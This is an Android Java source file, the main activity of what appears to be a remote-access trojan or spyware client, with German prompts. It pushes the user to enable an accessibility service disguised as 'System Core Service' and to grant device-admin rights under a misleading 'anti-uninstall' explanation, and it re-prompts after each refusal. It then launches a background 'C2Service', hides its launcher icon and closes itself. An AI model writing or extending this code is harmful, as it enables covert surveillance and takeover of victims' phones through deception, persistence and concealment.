package com.example.client;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.View;
import android.view.accessibility.AccessibilityManager;
import android.widget.Button;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;
import androidx.core.graphics.Insets;

import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_CODE_DEVICE_ADMIN = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Android 15 Edge-to-Edge Support
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            EdgeToEdge.enable(this);
        }
        
        setContentView(R.layout.activity_main);
        
        // Setup edge-to-edge window insets for Android 15
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            setupEdgeToEdgeInsets();
        }

        // Überprüfe, ob alle Berechtigungen bereits erteilt sind
        if (isAccessibilityServiceEnabled() && isDeviceAdminEnabled()) {
            startC2ServiceAndFinish();
            return;
        }

        Button enableButton = findViewById(R.id.enableButton);
        enableButton.setOnClickListener(v -> checkAndRequestPermissions());
    }

    private void checkAndRequestPermissions() {
        if (!isAccessibilityServiceEnabled()) {
            promptForAccessibility();
        } else if (!isDeviceAdminEnabled()) {
            promptForDeviceAdmin();
        }
    }

    private boolean isAccessibilityServiceEnabled() {
        AccessibilityManager am = (AccessibilityManager) getSystemService(Context.ACCESSIBILITY_SERVICE);
        if (am == null) return false;
        List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
        for (AccessibilityServiceInfo enabledService : enabledServices) {
            if (enabledService.getResolveInfo().serviceInfo.packageName.equals(getPackageName())) {
                return true;
            }
        }
        return false;
    }

    private boolean isDeviceAdminEnabled() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
        return dpm != null && dpm.isAdminActive(adminComponent);
    }

    private void promptForAccessibility() {
        new AlertDialog.Builder(this)
                .setTitle("Berechtigung erforderlich")
                .setMessage("Um die erweiterte Überwachung zu aktivieren, bitte den 'System Core Service' in den Barrierefreiheits-Einstellungen aktivieren.")
                .setPositiveButton("Einstellungen öffnen", (dialog, which) -> {
                    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    startActivity(intent);
                })
                .setNegativeButton("Abbrechen", null)
                .show();
    }

    private void promptForDeviceAdmin() {
        ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Diese Berechtigung ist erforderlich, um unbefugte Deinstallation zu verhindern und das Gerät zu sichern.");
        startActivityForResult(intent, REQUEST_CODE_DEVICE_ADMIN);
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        // Wenn der Benutzer von den Einstellungen zurückkehrt, Berechtigungen erneut überprüfen
        if (isAccessibilityServiceEnabled() && !isDeviceAdminEnabled()) {
            promptForDeviceAdmin();
        } else if (isAccessibilityServiceEnabled() && isDeviceAdminEnabled()) {
            startC2ServiceAndFinish();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE_DEVICE_ADMIN) {
            if (resultCode == Activity.RESULT_OK) {
                // Device admin aktiviert, nun den Service starten
                startC2ServiceAndFinish();
            } else {
                // Benutzer hat abgebrochen
                new AlertDialog.Builder(this)
                    .setTitle("Aktivierung fehlgeschlagen")
                    .setMessage("Device Admin-Aktivierung ist für die Funktionalität der Anwendung erforderlich.")
                    .setPositiveButton("Erneut versuchen", (dialog, which) -> promptForDeviceAdmin())
                    .setNegativeButton("Beenden", (dialog, which) -> finish())
                    .show();
            }
        }
    }

    private void startC2ServiceAndFinish() {
        // Start the background service
        Intent serviceIntent = new Intent(this, C2Service.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // App-Icon verstecken
        hideIcon();

        // Activity beenden, damit sie nicht sichtbar ist
        finish();
    }

    private void hideIcon() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
    
    /**
     * Setup edge-to-edge window insets for Android 15 compatibility
     */
    private void setupEdgeToEdgeInsets() {
        View mainView = findViewById(android.R.id.content);
        if (mainView != null) {
            ViewCompat.setOnApplyWindowInsetsListener(mainView, (v, insets) -> {
                Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
                v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
                return insets;
            });
        }
    }
}
